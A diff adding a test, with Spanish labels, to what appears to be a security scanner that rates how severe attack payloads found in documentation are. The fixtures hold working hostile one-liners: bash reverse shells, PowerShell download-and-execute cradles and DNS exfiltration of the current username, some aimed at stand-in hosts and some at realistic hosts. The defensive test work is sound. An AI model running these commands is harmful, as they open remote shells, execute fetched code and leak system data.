@@ -292,3 +292,18 @@ test('scripts remotos: lo que solo se muestra no cuenta', () => {
   assert.equal(onlyShown('info "$(curl -s https://evil.example/x | sh)"'), false, 'entre comillas dobles $( ) se ejecuta');
   assert.equal(onlyShown('curl https://x | sh'), false);
 });
+
+test('revisión: payloads de ejemplo con destino de marcador bajan; con host real, no', async (t) => {
+  const dir = fx.write(fx.tmpDir('review-dest'), {
+    'docs/a.md': 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n',
+    'docs/b.md': "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')\n",
+    'docs/c.md': 'dig $(whoami).burpcollaborator.net\n',
+    'docs/d.md': "IEX(New-Object Net.WebClient).DownloadString('https://cdn.corp-portal.com/s.ps1')\n",
+    'docs/e.md': 'dig $(whoami).k3j9x2.oast.fun\n',
+    'docs/f.md': 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\n',
+  });
+  t.after(() => fx.rm(dir));
+  const r = await analyzeTree(dir, {});
+  for (const f of ['docs/a.md', 'docs/b.md', 'docs/c.md']) assert.equal(r.threats.find((x) => x.file === f).severity, 'low', f);
+  for (const f of ['docs/d.md', 'docs/e.md', 'docs/f.md']) assert.ok(['critical', 'high'].includes(r.threats.find((x) => x.file === f).severity), `${f}: el destino puede ser real`);
+});
